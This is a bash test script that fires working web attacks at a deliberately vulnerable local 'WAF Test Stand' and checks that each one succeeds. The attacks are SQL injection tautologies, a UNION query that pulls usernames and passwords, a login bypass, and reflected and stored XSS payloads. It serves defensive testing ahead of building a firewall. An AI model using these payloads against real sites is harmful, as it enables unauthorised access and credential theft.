#!/bin/bash
# Attack demonstration script for WAF Test Stand
# Usage: ./attacks.sh [BASE_URL]
# Default base URL: http://localhost:8888

BASE_URL="${1:-http://localhost:8888}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GRAY='\033[0;37m'
NC='\033[0m'

PASS=0
FAIL=0

pass() {
    echo -e "  ${GREEN}[PASS]${NC} $1"
    PASS=$((PASS + 1))
}

fail() {
    echo -e "  ${RED}[FAIL]${NC} $1"
    FAIL=$((FAIL + 1))
}

info() {
    echo -e "  ${GRAY}$1${NC}"
}

echo -e "${CYAN}=== WAF Test Stand — Attack Demonstrations ===${NC}"
echo -e "Target: ${BASE_URL}\n"

# ---------------------------------------------------------------------------
# Test 0: Health check
# ---------------------------------------------------------------------------
echo -e "${YELLOW}[0] Health Check${NC}"
info "GET ${BASE_URL}/"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/")
if [ "${STATUS}" = "200" ]; then
    pass "Server is up (HTTP ${STATUS})"
else
    fail "Server returned HTTP ${STATUS} — is docker-compose up?"
    echo -e "\n${RED}Aborting: target is not reachable.${NC}"
    exit 1
fi

# ---------------------------------------------------------------------------
# Test 1: SQLi — Classic search (GET /search?q=)
# ---------------------------------------------------------------------------
echo -e "\n${YELLOW}[1] SQLi — Classic Search${NC}"

# 1a. Normal request — should return one product row
info "1a. Normal request: GET /search?q=Lenovo"
BODY=$(curl -s "${BASE_URL}/search?q=Lenovo")
if echo "${BODY}" | grep -qi "Lenovo"; then
    pass "1a: Normal search returned product result"
else
    fail "1a: Normal search — expected product name not found in response"
fi

# 1b. SQLi tautology — OR 1=1 should return ALL products (more than just Lenovo)
info "1b. SQLi tautology: GET /search?q=' OR 1=1--"
BODY=$(curl -s "${BASE_URL}/search?q=%27%20OR%201%3D1--")
# Seed has 6 products; if SQLi works we expect multiple product names
PRODUCT_COUNT=$(echo "${BODY}" | grep -oi "Logitech\|Samsung\|Sony\|LG\|Lenovo" | wc -l | tr -d ' ')
if [ "${PRODUCT_COUNT}" -ge 3 ]; then
    pass "1b: SQLi tautology dumped all products (found ${PRODUCT_COUNT} distinct brand mentions)"
else
    fail "1b: SQLi tautology — expected multiple brands, got ${PRODUCT_COUNT}"
fi

# 1c. UNION-based SQLi — extract credentials from users table
info "1c. SQLi UNION: GET /search?q=' UNION SELECT 1,username,password,0 FROM users--"
BODY=$(curl -s "${BASE_URL}/search?q=%27%20UNION%20SELECT%201%2Cusername%2Cpassword%2C0%20FROM%20users--")
if echo "${BODY}" | grep -qi "admin123\|analyst1"; then
    pass "1c: UNION SQLi extracted password hashes from users table"
else
    fail "1c: UNION SQLi — expected credential data not found in response"
fi

# ---------------------------------------------------------------------------
# Test 2: SQLi — Auth Bypass (POST /login)
# ---------------------------------------------------------------------------
echo -e "\n${YELLOW}[2] SQLi — Auth Bypass${NC}"

# 2a. Normal login — wrong password should be rejected
info "2a. Normal login with wrong password: POST /login username=admin&password=wrong"
BODY=$(curl -s -X POST "${BASE_URL}/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=wrong")
if echo "${BODY}" | grep -qi "Неверные\|Invalid\|неверн"; then
    pass "2a: Wrong password correctly rejected"
else
    fail "2a: Expected rejection message not found"
fi

# 2b. SQLi auth bypass — classic ' OR '1'='1 should log in without knowing the password
info "2b. SQLi bypass: POST /login username=' OR '1'='1' --&password=anything"
BODY=$(curl -s -X POST "${BASE_URL}/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "username=' OR '1'='1' --" \
    --data-urlencode "password=anything")
if echo "${BODY}" | grep -qi "Добро\|Welcome\|Роль\|role"; then
    pass "2b: SQLi auth bypass succeeded — logged in without valid credentials"
else
    fail "2b: SQLi auth bypass — expected welcome message not found"
fi

# ---------------------------------------------------------------------------
# Test 3: XSS — Reflected (GET /profile?name=)
# ---------------------------------------------------------------------------
echo -e "\n${YELLOW}[3] XSS — Reflected${NC}"

# 3a. Normal request — plain name rendered safely
info "3a. Normal request: GET /profile?name=John"
BODY=$(curl -s "${BASE_URL}/profile?name=John")
if echo "${BODY}" | grep -qi "John"; then
    pass "3a: Normal profile rendered the name"
else
    fail "3a: Normal profile — name not found in response"
fi

# 3b. Reflected XSS via <script> tag
info "3b. XSS script tag: GET /profile?name=<script>alert('XSS')</script>"
BODY=$(curl -s "${BASE_URL}/profile?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E")
if echo "${BODY}" | grep -qi "<script>alert"; then
    pass "3b: Reflected XSS — <script> tag present unescaped in response"
else
    fail "3b: Reflected XSS — script tag not found or was escaped"
fi

# 3c. Reflected XSS via <img onerror>
info "3c. XSS img onerror: GET /profile?name=<img src=x onerror=alert(1)>"
BODY=$(curl -s "${BASE_URL}/profile?name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E")
if echo "${BODY}" | grep -qi "onerror=alert"; then
    pass "3c: Reflected XSS — img onerror payload present unescaped in response"
else
    fail "3c: Reflected XSS — img onerror not found or was escaped"
fi

# ---------------------------------------------------------------------------
# Test 4: XSS — Stored (POST + GET /guestbook)
# ---------------------------------------------------------------------------
echo -e "\n${YELLOW}[4] XSS — Stored${NC}"

# 4a. Normal guestbook entry
info "4a. Normal entry: POST /guestbook author=Tester&message=Hello+WAF"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" -L -X POST "${BASE_URL}/guestbook" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "author=Tester&message=Hello+WAF")
if [ "${STATUS}" = "200" ]; then
    pass "4a: Normal guestbook POST accepted and redirect followed (HTTP ${STATUS})"
else
    fail "4a: Normal guestbook POST returned HTTP ${STATUS}"
fi

# 4b. Store XSS payload
PAYLOAD="<script>alert('stored XSS')</script>"
info "4b. Stored XSS: POST /guestbook author=Hacker&message=<script>alert('stored XSS')</script>"
curl -s -o /dev/null -L -X POST "${BASE_URL}/guestbook" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "author=Hacker" \
    --data-urlencode "message=${PAYLOAD}"

# 4c. Retrieve guestbook and verify the payload was stored unescaped
info "4c. Verify: GET /guestbook — check that script tag is stored unescaped"
BODY=$(curl -s "${BASE_URL}/guestbook")
if echo "${BODY}" | grep -qi "<script>alert('stored XSS')</script>"; then
    pass "4c: Stored XSS confirmed — payload retrieved unescaped from guestbook"
else
    fail "4c: Stored XSS — payload not found or was escaped in guestbook response"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
TOTAL=$((PASS + FAIL))
echo -e "\n${CYAN}=== Summary ===${NC}"
echo -e "  Tests run : ${TOTAL}"
echo -e "  ${GREEN}Passed    : ${PASS}${NC}"
if [ "${FAIL}" -gt 0 ]; then
    echo -e "  ${RED}Failed    : ${FAIL}${NC}"
else
    echo -e "  Failed    : ${FAIL}"
fi

if [ "${FAIL}" -eq 0 ]; then
    echo -e "\n${GREEN}All attacks confirmed — test stand is vulnerable as expected.${NC}"
    echo -e "${CYAN}WAF is ready for implementation.${NC}"
else
    echo -e "\n${YELLOW}Some tests failed — check that the test stand is running and seed data is present.${NC}"
fi

exit "${FAIL}"
